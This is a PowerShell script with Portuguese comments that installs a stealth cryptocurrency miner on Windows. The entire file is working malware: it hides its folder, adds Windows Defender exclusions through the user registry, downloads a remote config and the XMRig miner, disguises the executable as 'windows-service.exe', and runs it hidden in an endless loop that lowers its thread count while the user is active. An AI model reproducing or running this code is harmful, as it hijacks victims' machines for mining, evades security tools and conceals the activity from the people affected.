# CONFIGURAÇÃO STEALTH - SEM ADMIN
$WorkingDir = "$env:APPDATA\Microsoft\Network\Cache"
$MinerExe = "windows-service.exe"
$MinerPath = "$WorkingDir\$MinerExe"
$ConfigPath = "$WorkingDir\config.json"

# Função para exceção SEM ADMIN
function Add-UserExclusions {
    try {
        # Método Registry (User Context)
        $regPath = "HKCU:\Software\Microsoft\Windows Defender\Exclusions\Paths"
        if (!(Test-Path $regPath)) {
            New-Item -Path $regPath -Force | Out-Null
        }
        Set-ItemProperty -Path $regPath -Name $WorkingDir -Value 0 -ErrorAction SilentlyContinue
        
        # Método alternativo
        $defenderConfig = "$env:TEMP\wd_exclusion.reg"
        @"
Windows Registry Editor Version 5.00

[HKEY_CURRENT_USER\Software\Microsoft\Windows Defender\Exclusions\Paths]
"$WorkingDir"=dword:00000000
"@ | Set-Content $defenderConfig
        
        Start-Process "reg" -ArgumentList "import `"$defenderConfig`"" -Wait -WindowStyle Hidden
        Remove-Item $defenderConfig -Force -ErrorAction SilentlyContinue
    } catch { }
}

# Função de download stealth
function Download-Stealth {
    param($Url, $Output)
    try {
        $webClient = New-Object System.Net.WebClient
        $webClient.Headers.Add('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
        $webClient.DownloadFile($Url, $Output)
        return $true
    } catch {
        return $false
    }
}

# Inicialização stealth
function Initialize-StealthMiner {
    # Criar diretório
    if (!(Test-Path $WorkingDir)) {
        New-Item -ItemType Directory -Path $WorkingDir -Force | Out-Null
    }
    attrib +h +s "$WorkingDir" 2>$null
    
    # Adicionar exceções
    Add-UserExclusions
    
    # Baixar configuração
    $configUrl = "https://raw.githubusercontent.com/ruendynarcy/mining/main/config.json"
    Download-Stealth -Url $configUrl -Output $ConfigPath
    
    # Baixar e extrair XMRig se não existir
    if (!(Test-Path $MinerPath)) {
        $minerUrl = "https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-windows-x64.zip"
        $tempZip = "$env:TEMP\update_$([System.Guid]::NewGuid().ToString().Substring(0,8)).zip"
        
        if (Download-Stealth -Url $minerUrl -Output $tempZip) {
            try {
                Add-Type -AssemblyName System.IO.Compression.FileSystem
                [System.IO.Compression.ZipFile]::ExtractToDirectory($tempZip, $WorkingDir)
                
                # Encontrar e renomear executável
                $exeFile = Get-ChildItem "$WorkingDir\*.exe" -Recurse | Where-Object { $_.Name -eq "xmrig.exe" } | Select-Object -First 1
                if ($exeFile) {
                    Move-Item $exeFile.FullName $MinerPath -Force
                    # Limpar subpastas
                    Get-ChildItem "$WorkingDir\*" -Directory | Remove-Item -Recurse -Force 2>$null
                }
                Remove-Item $tempZip -Force 2>$null
            } catch { }
        }
    }
    
    return (Test-Path $MinerPath)
}

# Mineração inteligente
function Start-StealthMining {
    $pauseUntil = $null
    
    while ($true) {
        # Verificar uso do sistema
        try {
            $cpu = (Get-WmiObject Win32_Processor).LoadPercentage
            $idleTime = 600
            try { $idleTime = (Get-WmiObject Win32_UserDesktop | Where-Object { $_.__RELPATH -match $env:USERNAME }).IdleTime } catch { }
            $userActive = ($idleTime -lt 180)
        } catch {
            $cpu = 0
            $userActive = $true
        }
        
        # Verificar se minerador está rodando
        $isRunning = Get-Process -Name "windows-service" -ErrorAction SilentlyContinue
        
        if (!$isRunning -and (Test-Path $MinerPath)) {
            $threads = if ($userActive -or $cpu -gt 70) { 30 } else { 60 }
            
            $processInfo = New-Object System.Diagnostics.ProcessStartInfo
            $processInfo.FileName = $MinerPath
            $processInfo.Arguments = "--config=config.json --cpu-max-threads-hint=$threads --no-title --quiet --randomx-init=0"
            $processInfo.WorkingDirectory = $WorkingDir
            $processInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
            $processInfo.CreateNoWindow = $true
            $processInfo.UseShellExecute = $false
            
            [System.Diagnostics.Process]::Start($processInfo) | Out-Null
        }
        
        Start-Sleep 60
    }
}

# Execução principal
try {
    if (Initialize-StealthMiner) {
        Start-StealthMining
    }
} catch {
    exit
}